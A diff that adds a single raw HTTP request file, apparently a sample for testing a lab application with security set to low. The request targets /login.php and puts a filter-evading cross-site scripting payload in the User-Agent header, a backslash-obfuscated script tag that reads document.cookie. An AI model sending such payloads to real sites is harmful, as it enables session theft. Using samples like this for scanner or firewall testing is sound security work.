@@ -1,0 +1,8 @@
+GET /login.php HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: <s\Cr\ipt\>alert(document\.cookie)</s\Cr\ipt\>\;/>
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Cookie: PHPSESSID=nvd6qtahb7914b5va0vmeudb92; security=low
+
